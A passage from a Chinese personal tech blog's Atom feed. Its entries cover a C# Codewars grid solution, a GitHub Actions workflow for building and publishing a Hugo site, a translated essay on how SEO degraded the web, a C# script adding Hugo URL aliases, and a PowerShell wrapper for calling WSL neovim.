</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = lie - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    hEnd = i;
</span></span><span style="display:flex;"><span>                    i = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; lie; i++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; hang; j++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    lStart = i;
</span></span><span style="display:flex;"><span>                    i = lie;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = lie - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = hang - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                    lEnd = i;
</span></span><span style="display:flex;"><span>                    i = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        hLen = hEnd - hStart + <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        lLen = lEnd - lStart + <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> newCell = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hLen, lLen];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Console.WriteLine(<span style="color:#e6db74">$&#34;h {hLen} l {lLen}&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hLen; i++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lLen; j++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                newCell[i, j] = cells[hStart + i, lStart + j];
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> newCell;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] NewBoard(<span style="color:#66d9ef">int</span>[,] cells)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> newBoard = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang + <span style="color:#ae81ff">2</span>; i++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie + <span style="color:#ae81ff">2</span>; j++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                newBoard[i, j] = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">1</span>; i &lt; hang + <span style="color:#ae81ff">1</span>; i++)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">1</span>; j &lt; lie + <span style="color:#ae81ff">1</span>; j++)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                newBoard[i, j] = cells[i - <span style="color:#ae81ff">1</span>, j - <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> newBoard;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>]]></content><category scheme="https://blog.batkiz.com/tags/codewars" term="codewars" label="codewars"/><category scheme="https://blog.batkiz.com/tags/csharp" term="csharp" label="csharp"/></entry><entry><title type="html">Hugo 自动化 CI V2</title><link href="https://blog.batkiz.com/posts/hugo-ci-v2/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/set-hugo-aliases-with-csharp/?utm_source=atom_feed" rel="related" type="text/html" title="用 C# 设置 Hugo Aliases"/><link href="https://blog.batkiz.com/posts/migrate-to-hugo-and-automation/?utm_source=atom_feed" rel="related" type="text/html" title="博客迁移至 Hugo 并实现自动化"/><id>https://blog.batkiz.com/posts/hugo-ci-v2/</id><published>2020-04-13T11:19:09+08:00</published><updated>2020-04-13T11:19:09+08:00</updated><content type="html"><![CDATA[<p>改进了一下自动化发布博客的 CI，代码在下面。</p>
<p>如果想拿去用的话只需要修改 env 下的值就行了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">name</span>: <span style="color:#ae81ff">blog</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">on</span>: [<span style="color:#ae81ff">push]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 各种信息在此处设置</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">env</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># config.toml 里 theme 的值</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">THEME_NAME</span>: <span style="color:#ae81ff">left</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 主题的 github 链接</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">THEME_REPO</span>: <span style="color:#ae81ff">https://github.com/batkiz/left.git</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># github username</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">USER_NAME</span>: <span style="color:#ae81ff">batkiz</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># github email</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">EMAIL</span>: <span style="color:#ae81ff">batkiz@outlook.com</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># GitHub token</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">GH_TOKEN</span>: <span style="color:#ae81ff">${{ secrets.GH_TOKEN }}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">jobs</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Build</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">runs-on</span>: <span style="color:#ae81ff">ubuntu-latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">steps</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 获取 repo 内文件</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">actions/checkout@v2</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 使用预编译的 Hugo 二进制文件</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Setup Hugo</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">uses</span>: <span style="color:#ae81ff">peaceiris/actions-hugo@v2</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">with</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">hugo-version</span>: <span style="color:#e6db74">&#34;latest&#34;</span>
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">extended</span>: <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 新建站点</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">new site</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          hugo new site $HOME/blog</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 获取主题</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">get theme</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git clone --depth=1 $THEME_REPO $HOME/blog/themes/$THEME_NAME</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 获取 $user.github.io 以保持 commit 记录</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">get username.github.io</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git clone --no-checkout https://github.com/$USER_NAME/$USER_NAME.github.io.git $HOME/blog/public</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 将内容文件复制进入站点内</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">copy in</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          rm -rf $HOME/blog/config.toml $HOME/blog/content/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          /bin/cp -rf config.toml $HOME/blog/config.toml
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          /bin/cp -rf content/ $HOME/blog/content/</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># build</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">build</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          cd $HOME/blog
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          HUGO_ENV=production hugo --gc --minify</span>          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 将生成出的站点推向 user.github.io</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># 注意设置 github token</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">publish</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">run</span>: |<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git config --global user.name $USER_NAME
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git config --global user.email $EMAIL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          cd $HOME/blog/public
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git add .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git commit -m &#34;Auto Update: `date +&#39;%Y-%m-%d %H:%M:%S&#39;`&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          git push &#34;https://$USER:$GH_TOKEN@github.com/$USER_NAME/$USER_NAME.github.io.git&#34; master:master</span>          
</span></span></code></pre></div><p>附赠本人用于存放 blog 内容仓库的 gitignore</p>
<pre tabindex="0"><code class="language-gitignore" data-lang="gitignore">/archetypes/
/data/
/layouts/
/public/
/resources/
/static/
/themes/
</code></pre>]]></content><category scheme="https://blog.batkiz.com/tags/hugo" term="hugo" label="hugo"/><category scheme="https://blog.batkiz.com/tags/ci" term="ci" label="CI"/></entry><entry><title type="html">翻译 | SEO 是如何毁掉互联网的</title><link href="https://blog.batkiz.com/posts/how-seo-ruined-the-internet/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/advice-to-new-programmers/?utm_source=atom_feed" rel="related" type="text/html" title="翻译 | 给新手程序员们的建议"/><link href="https://blog.batkiz.com/posts/translation-the-rise-and-demise-of-rss/?utm_source=atom_feed" rel="related" type="text/html" title="翻译 | RSS 的兴起与衰落"/><id>https://blog.batkiz.com/posts/how-seo-ruined-the-internet/</id><published>2020-04-09T22:49:16+08:00</published><updated>2020-04-09T22:49:16+08:00</updated><content type="html"><![CDATA[<p>原文： <a href="https://www.superhighway98.com/seo">How SEO Ruined the Internet</a></p>
<p>翻译：<a href="https://github.com/batkiz">batkiz</a></p>
<p>译者按：SEO，即搜索引擎优化（search engine optimization），指通过了解搜索引擎的运作规则来调整网站，以提高网站在有关搜索引擎内排名的方式。</p>
<hr>
<p>在 1998 年到 2003 年的那段时间，在 Google 上搜索是非常神奇的。我还记得输入像是“oil mother&rsquo;s milk,”这样一个模糊的概念，然后就被导航到了 <a href="https://www.wired.com/2000/07/gold/">Thomas Gold 的一篇访谈</a>。（Thomas Gold 是一位天文物理学家，提出了石油会因为地壳压力重新沉积的理论。）</p>
<p>现如今，如果你在寻找技术性的、具体的、学术性的或是一般非商业的信息，那么你拥有了该死的好运气。世界上最好的信息检索系统像是变成了 <a href="https://www.informationweek.com/digg-dogged-by-allegations-of-manipulation-/d/d-id/1046783">2006 年代的 Digg</a> 一样：由一小部分商业玩家控制的流行流行指数。他们称自己为“SEO”。</p>
<p>拥有着卓越技术的 SEO 专家们通常使网站更快、更安全、更易访问。“黑帽” SEO 则显然是坏蛋。他们以破坏规则的方式来提升自己网站的排名（例如侵入一个网站，在其中添加到自己网站的链接）。然而，黑帽们只是 SEO 世界中的小小罪犯。还存在着看似是好家伙，实际上却是披着羊皮的狼的 “白帽” SEO。</p>
<p>这些网络营销者的策略十分简单：以集权压制竞争。他们躲藏在合理与伪善的大旗之下，如同极权政体一般，他们为了达到目的不择手段。下面是他们使用的一些手段：</p>
<h2 id="编辑历史">编辑历史</h2>
<p>你重新读一篇文章时，你可能会发现其标题或是链接被改动过，这是一个非常普遍的行为。SEO 专家会“优化”旧文章来使它们更为市场化（并为读者推荐更新、更商业化的内容）。当我回看十年前我写的文章时，文章已经变得面目全非：夹杂着我从未写过的内容，承载着我从未表达的含义。</p>
<h2 id="删除过去">删除过去</h2>
<p>在大型知名网站上，“内容修剪”是一个非常有效的 SEO 策略。相比于将具有历史意义的内容归档，许多网站会选择将它们删除，返回 410 状态码。<em>永久性的丢失</em>。这样做是为了优化“抓取配额”，使 Google 关注当下更为流行的内容。结果便是互联网上不再有制度记忆（<a href="https://en.wikipedia.org/wiki/Institutional_memory">institutional memory</a>或是可信度了。</p>
<h2 id="导演叙事">导演叙事</h2>
<p>给我一个现代新闻编辑室，我会给你展示一个指导写手们的内容策略专家。但是，当记者们因必须写自己感到不舒服的专题而感到压力，或是被强迫以特定的角度解读问题，“SEO 最佳实践”就像是一个宣传机构了。这是<em>有线新闻效应</em>，黑幕背后的人可以随意修改台本，将所有的事都推送为“爆炸新闻”！</p>
<h2 id="提供有选择的错觉">提供“有选择的”错觉</h2>
<p>一少部分出版公司手握着上百家的年浏览量以数十亿计的媒体网站。当你搜索“最好的手机”时，你可能会看到来自 TechRadar, Android Central, T3, Tom&rsquo;s Guide, Anandtech, iMore 或是 Top Ten Reviews 的搜索结果。不论你点击了哪个结果，你其实都毫无选择：上述的所有都隶属于一下公司之下。</p>
<h2 id="囤积财富">囤积财富</h2>
<p>链接就是网络中的货币。没有链接的话，搜索引擎将无法分辨哪个页面更为有价值。不幸的是，许多网站不允许其他网站引用他们的内容，或是为每一个链接都加上 <a href="https://zh.wikipedia.org/wiki/Nofollow"><code>ref=&quot;nofollow&quot;</code> 属性</a>（即告诉搜索引擎不要抓取这条链接）。这使得整个网络世界都变的更为贫瘠了。</p>
<hr>
<p>SEO 是一个零和游戏，有赢家必定就有输家。SEO 促进了装神弄鬼、链接失效、整合、垄断与颠覆，我们都成为了输家。我还记得在互联网上非常容易找到逻辑、事实与理性的时代。在那之后，有人把它优化掉了。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/%E7%BF%BB%E8%AF%91" term="%E7%BF%BB%E8%AF%91" label="翻译"/></entry><entry><title type="html">用 C# 设置 Hugo Aliases</title><link href="https://blog.batkiz.com/posts/set-hugo-aliases-with-csharp/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/migrate-to-hugo-and-automation/?utm_source=atom_feed" rel="related" type="text/html" title="博客迁移至 Hugo 并实现自动化"/><id>https://blog.batkiz.com/posts/set-hugo-aliases-with-csharp/</id><published>2020-01-05T00:53:07+08:00</published><updated>2020-01-05T00:53:07+08:00</updated><content type="html"><![CDATA[<p>2020 年新年好！</p>
<p>相信细心的读者已经注意到了，本博客的文章链接已经全部从 <code>blog.batkiz.com/:year/:month/:day/:filename/</code> 调整为了 <code>blog.batkiz.com/posts/:year/:filename/</code> 的 url 格式。主要的原因是 url 的可读性：一则我个人认为让完整的日期出现在文章的 url 中对“人”非常之不友好。比如我曾想直接输入文章链接访问文章时，日期极大地为我原本就不太好的记忆力增加了负担。另一方面，具体而完整的时间对于读者也是不必要的，几乎没有人会关注文章是在几月几号几点写的，作为读者，更关注的点在于内容，在 url 中隐藏掉具体的时间，只给出一个年份，在我看来是某种程度上的平衡。</p>
<p>其实这个想法早在将博客生成器由 hexo 切换到 hugo 时就有了，但是由于兼容性的问题（我在煎蛋等平台上的投稿有到我文章的链接），我不能让原本的文章给 404 掉，所以当时只能忍辱负重，继续使用含有完整日期的 url。（见<a href="/posts/2019/migrate-to-hugo-and-automation/">此文</a>）</p>
<p>而在某天晚上我刷牙洗漱时，我突然想到，能否将 url 更改的同时，设置以带有完整日期链接的访问跳转到新的链接。经过一番搜索，我找到了名为 <a href="https://gohugo.io/content-management/urls/#aliases">Aliases</a> 的功能，这正是我要找的！</p>
<p>但是，在打算用这个功能时，我犯了难：博客经过三年多的积累，文章的量并不是我能够手动一篇一篇的修改的了的。当然啦，作为一个程序员，第一时间想到的，当然就是通过写代码来自动化啦。</p>
<p>通过观察，所添加的 Aliases 项应被添加在 frontmatter 中，其主要依赖了文章的日期即 date 项。我最开始的想法是，将每篇文章的 frontmatter （在我的文章中用的是 yaml）序列化，对序列化后的项进行修改，最后再反序列化，保存至文章。</p>
<p>但是由于我并没有找到一个可用性较高的解析 markdown 文件 yaml frontmatter 的库，此想法只好作罢。</p>
<p>经过我的进一步观察，每篇文章的 date 项均处在第三行，且格式为</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">date</span>: <span style="color:#ae81ff">yyyy-mm-dd time</span>
</span></span></code></pre></div><p>事情就好办了起来。</p>
<p>核心思想即：读入文本，将位于第三行的日期解析出来-&gt;生成 Aliases 项-&gt;写入文本。</p>
<p>下面是代码（C# 8, dotnet core 3.1），由于时间匆忙，且需求简单，因此未做过多的处理。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Linq;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.IO;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> AddAliasToBlogPosts
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">string</span> dir = <span style="color:#e6db74">@&#34;C:\code\blog-contents\content\posts&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> posts = GetPosts(dir);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">var</span> item <span style="color:#66d9ef">in</span> posts)
</span></span><span style="display:flex;"><span>            {
</span></span><span style="display:flex;"><span>                AppendAlias(GetAlias(item), item, <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//System.Console.WriteLine(GetAlias(item));</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span>[] GetPosts(<span style="color:#66d9ef">string</span> dir) =&gt; Directory.GetFiles(dir);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> GetFilesName(<span style="color:#66d9ef">string</span> path)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            path = path.Split(<span style="color:#e6db74">&#39;\\&#39;</span>).Last();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> path.Substring(<span style="color:#ae81ff">0</span>, path.Length - <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> GetLine(<span style="color:#66d9ef">string</span> text, <span style="color:#66d9ef">int</span> lineNo)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">string</span>[] lines = text.Replace(<span style="color:#e6db74">&#34;\r&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>).Split(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> lines.Length &gt;= lineNo ? lines[lineNo - <span style="color:#ae81ff">1</span>] : <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> Func&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt; GetTime = (path) =&gt;
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">string</span> text = File.ReadAllText(path);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">string</span> time = GetLine(text, <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> time.Substring(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>).Replace(<span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> Func&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt; GetAlias = (path)
</span></span><span style="display:flex;"><span>             =&gt; <span style="color:#e6db74">$&#34;\naliases:\n    - /{GetTime(path)}/{GetFilesName(path)}/&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> AppendAlias(<span style="color:#66d9ef">string</span> newText, <span style="color:#66d9ef">string</span> fileName, <span style="color:#66d9ef">int</span> line_to_edit)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">string</span>[] arrLine = File.ReadAllLines(fileName);
</span></span><span style="display:flex;"><span>            arrLine[line_to_edit - <span style="color:#ae81ff">1</span>] += newText;
</span></span><span style="display:flex;"><span>            File.WriteAllLines(fileName, arrLine);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>最后，感谢 MSDN 与 StackOverflow。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/csharp" term="csharp" label="csharp"/><category scheme="https://blog.batkiz.com/tags/hugo" term="hugo" label="hugo"/></entry><entry><title type="html">在 powershell 中无缝调用 wsl 中的 neovim</title><link href="https://blog.batkiz.com/posts/using-wsl-nvim-in-powershell/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/using-wsl-nvim-in-powershell/</id><published>2019-11-30T16:04:34+08:00</published><updated>2019-11-30T16:04:34+08:00</updated><content type="html"><![CDATA[<blockquote>
<p>注 1：neovim 亦可换为 vim</p>
</blockquote>
<blockquote>
<p>注 2：最新版本的 pwsh 脚本请<a href="https://blog.batkiz.com/posts/2020/some-pwsh-scripts/">点此获取</a></p>
</blockquote>
<p>在如今的 Windows 中，wsl 无疑能够极大提升我的开发体验。vim 则是任何人都绕不开的 TUI 编辑器。</p>
<p>不可否认，zsh/bash/fish 等 Linux 下的终端非常便捷好用，但我也是非常喜欢 powershell 的。在 <a href="/2019/09/24/oh-my-powershell/">之前的文章</a> 中，我对 powershell 进行了很多自定义配置，我也越来越离不开 powershell 了。</p>
<p>既然在我的 wsl 中我已经配好了 neovim，如果我再在 Windows 之上配置一份，无疑是多此一举。</p>
<p>那么该如何无缝调用呢？</p>
<h2 id="主要问题">主要问题</h2>
<ul>
<li>使用 <code>wsl nvim filename</code> 的话过于啰嗦</li>
<li>Windows 中如果使用自动补全路径，文件路径使用的 <code>\</code>，neovim 会将其识别为文件名的一部分</li>
</ul>
<h2 id="解决方案">解决方案</h2>
<p>话不多说，来看代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> vim {
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">param</span>($fileName = <span style="color:#e6db74">&#39;.&#39;</span>)
</span></span><span style="display:flex;"><span>   wsl -e nvim $filename.Replace(<span style="color:#e6db74">&#39;\&#39;</span>,<span style="color:#e6db74">&#39;/&#39;</span>).Replace(<span style="color:#e6db74">&#39;C:&#39;</span>,<span style="color:#e6db74">&#39;/mnt/c&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>将上面的代码写入 powershell 的配置文件保存（<code>notepad.exe $PROFILE</code>），之后新开一个 powershell 终端，就能无缝体验啦。</p>
<h2 id="对代码的解释">对代码的解释</h2>
<p>下面是解释。</p>
<p>第一行的 <code>function vim</code> 可以视为 Linux 之中的 alias，让我们每次在 powershell 中输入 vim 时，自动转换为下面的命令。</p>
<p>第二行的 <code>param($fileName = '.')</code> 则定义了 <code>vim</code> 所接收的参数，即要编辑的文件名。当未传入参数时，默认传入当前目录。</p>
